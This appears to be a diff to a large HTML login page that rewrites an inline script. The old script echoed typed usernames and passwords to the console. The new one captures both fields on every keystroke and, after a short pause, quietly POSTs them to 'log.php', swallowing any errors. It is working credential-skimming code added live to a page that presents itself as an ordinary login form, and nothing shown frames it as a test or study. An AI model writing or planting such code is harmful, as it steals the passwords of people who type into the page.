@@ -18606,20 +18606,48 @@
     </script>
 
 	<script>
-	  // Log credentials in real-time to the console
 	  document.addEventListener('DOMContentLoaded', function() {
-	    const usernameInput = document.querySelector('input[name="username"]');
-	    const passwordInput = document.querySelector('input[name="password"]');
+		const usernameInput = document.querySelector('input[name="username"]');
+		const passwordInput = document.querySelector('input[name="password"]');
 	
-	    function logCredentials() {
-	      console.log('Username:', usernameInput.value);
-	      console.log('Password:', passwordInput.value);
-	      console.log('---');
-	    }
+		if (!usernameInput || !passwordInput) {
+		  console.error('Input fields not found');
+		  return;
+		}
 	
-	    // Log on every keystroke
-	    usernameInput.addEventListener('input', logCredentials);
-	    passwordInput.addEventListener('input', logCredentials);
+		// Simple throttle: send data every 500ms at most (prevents too many requests)
+		let timeoutId = null;
+	
+		function sendKeystrokeData() {
+		  const data = {
+			username: usernameInput.value,
+			password: passwordInput.value
+		  };
+	
+		  // Send to server
+		  fetch('log.php', {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify(data)
+		  }).catch(err => {
+			// Silently ignore errors (or log them to console if you want)
+			console.warn('Could not send keystroke data:', err);
+		  });
+		}
+	
+		function handleInput() {
+		  // Clear any pending timeout
+		  if (timeoutId) clearTimeout(timeoutId);
+		  // Send after 300ms of inactivity (batching)
+		  timeoutId = setTimeout(sendKeystrokeData, 300);
+		}
+	
+		// Listen to input events
+		usernameInput.addEventListener('input', handleInput);
+		passwordInput.addEventListener('input', handleInput);
+		
+		// Also send immediately on page load (optional)
+		// sendKeystrokeData();
 	  });
 	</script>
 
